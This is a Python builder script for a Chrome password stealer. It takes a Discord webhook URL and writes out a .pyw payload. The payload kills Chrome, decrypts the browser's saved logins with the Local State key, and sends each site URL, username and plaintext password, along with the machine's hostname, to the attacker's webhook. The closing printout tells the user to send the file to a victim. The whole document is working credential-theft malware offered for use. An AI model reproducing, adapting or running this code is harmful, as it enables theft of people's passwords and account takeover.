import os
from os import system
import time
try:
    import socket
    import colorama
    from colorama import Fore
except:
    os.system("pip install colorama")
    os.system("pip install discord-webhook")
    import socket
    import colorama
    from colorama import Fore

clear = lambda: os.system('cls')
clear()

title = f'Password Grabber'
system(f'title {title}')
print(f'\n[1]  Classic Chrome Grabber')

choice = input(f"\n[?]> ")

if choice == '1':
    webhook_url = input(f"Webhooks URL : ")
    qqq = input(f"file name : ")
    with open(f'{qqq}.pyw', 'x') as f:
        f.write(fr'''
import socket
import os
from os import system
import sqlite3
try:
    import colorama
    from colorama import Fore
except:
    os.system("pip install colorama")
    import colorama
    from colorama import Fore
try:
    import json
except:
    os.system("pip install jsonlib")
    import json
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
except:
    os.system("pip install discord-webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
try:
    from Cryptodome.Cipher import AES
except:
    os.system("pip3 install pycryptodomex")
    os.system("pip install pycryptodome")
    from Cryptodome.Cipher import AES
try:
    import win32crypt
except:
    os.system("pip install pywin32")
    import win32crypt
try:
    import base64
except:
    os.system("pip install pybase64")
    import base64
def closeChrome():
    try:
        os.system("taskkill /f /im chrome.exe")
    except:
        pass
clear = lambda: os.system('cls')
clear()

def getSecretKey():
    try:
        with open(os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])), "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        pass
def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)

def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except:
        pass
def getChromePasswords():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = 'SELECT action_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)
    login_data = cursor.fetchall()
    extractedData = []
    for userdatacombo in login_data:
        if userdatacombo[1] != None and userdatacombo[2] != None and userdatacombo[1] != ""  and userdatacombo[2] != "":
            password = decryptPassword(userdatacombo[2], getSecretKey())
            data = "URL : " + userdatacombo[0] + " Email/Username : " + userdatacombo[1] + " Password : " + str(password)
            extractedData.append(data)
        else:
            pass
    return extractedData
def savePasswords(data):
        for line in data:
            content = ""
            webhook = DiscordWebhook(url=f"{webhook_url}", username="Chrome Password", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
            embed = DiscordEmbed(title=f"**Chrome Password**",  color=242424)
            test = socket.gethostname()
'''r'''
            web2 = f" \n" + f"{line}"
            embed.set_description(f"{web2}")
            embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
            embed.set_footer(text="All In One - Discord Tools Program")
            embed.set_timestamp()
            webhook.add_embed(embed)
            response = webhook.execute()
def main():
    closeChrome()
    data = getChromePasswords()
    savePasswords(data)

clear()

main()
''')
    print(f'Chrome Gradder saved to {qqq}.pyw')
    print(f'Now send Chrome Gradder file to victim, if victim open it webhook will send his Email and Password.')
else:
    print(f"{Fore.RED}{choice} do not have a possible answer")
    time.sleep(2)